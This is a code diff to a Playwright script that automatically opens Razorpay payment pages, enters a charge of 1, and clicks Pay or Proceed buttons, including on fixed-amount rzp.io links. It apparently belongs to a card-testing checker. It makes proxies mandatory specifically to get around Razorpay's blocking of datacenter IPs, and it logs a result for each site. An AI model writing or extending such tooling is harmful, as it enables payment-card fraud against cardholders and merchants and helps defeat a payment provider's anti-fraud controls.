@@ -79,14 +79,32 @@ def main():
         pg.on("response", on_resp)
 
         try:
+            if not args.get("proxy_server"):
+                out({"status": "ERROR", "response": "proxy is MANDATORY — razorpay blocks datacenter IPs at checkout", "site": site, "raw": ""})
             pg.goto(site, timeout=60000, wait_until="domcontentloaded")
             pg.wait_for_timeout(4000)
             amt = pg.query_selector("input[type=number]")
             pay_btn = pg.query_selector("input[type=button]")
-            if not amt or not pay_btn:
+            if not pay_btn:
+                # fixed-amount pages (rzp.io links, pages.razorpay.com): no amount box —
+                # click the visible Pay/Proceed/Next button directly
+                for f in [pg] + [f for f in pg.frames if "razorpay" in f.url]:
+                    got = f.evaluate("""() => {
+                        for (const bt of document.querySelectorAll('button, input[type=button], a[role=button]')) {
+                            const t = (bt.textContent || bt.value || '').trim();
+                            if (/^(pay|proceed|next|pay now)/i.test(t) && bt.offsetParent) { bt.click(); return true; }
+                        }
+                        return false;
+                    }""")
+                    if got:
+                        pay_btn = True
+                        break
+            if not amt and not pay_btn:
                 out({"status": "SITE_FAIL", "response": "not a payment page", "site": site, "raw": ""})
-            amt.fill("1")
-            pay_btn.click()
+            if amt:
+                amt.fill("1")
+            if pay_btn is not True:
+                pay_btn.click()
             pg.wait_for_timeout(9000)
 
             cf = None
